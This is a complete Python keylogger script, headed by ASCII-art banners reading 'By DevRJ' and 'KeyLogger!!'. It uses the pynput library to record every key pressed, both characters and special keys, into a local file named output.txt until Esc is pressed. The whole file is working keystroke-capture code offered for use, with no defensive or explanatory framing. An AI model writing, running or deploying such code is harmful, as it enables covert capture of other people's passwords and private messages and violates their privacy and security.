#  ____          ____             ____     _ 
# | __ ) _   _  |  _ \  _____   _|  _ \   | |
# |  _ \| | | | | | | |/ _ \ \ / / |_) |  | |
# | |_) | |_| | | |_| |  __/\ V /|  _ < |_| |
# |____/ \__, | |____/ \___| \_/ |_| \_\___/ 
#        |___/                               
#  _  __          _                                _ _ 
# | |/ /___ _   _| |    ___   __ _  __ _  ___ _ __| | |
# | ' // _ \ | | | |   / _ \ / _` |/ _` |/ _ \ '__| | |
# | . \  __/ |_| | |__| (_) | (_| | (_| |  __/ |  |_|_|
# |_|\_\___|\__, |_____\___/ \__, |\__, |\___|_|  (_|_)
#           |___/            |___/ |___/          

from pynput.keyboard import Key,Listener

with open("output.txt", "w") as file:
    file.write("KEYLOGGER Python Script\n\n")

def on_press(key):
    try:
        with open("output.txt", "a") as file:
            text_to_append = 'Key pressed: {0}'.format(key.char)
            file.write(text_to_append + "\n")
    except AttributeError:
        with open("output.txt", "a") as file:
            text_to_append = 'Special key pressed: {0}'.format(key)
            file.write(text_to_append + "\n")
        
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
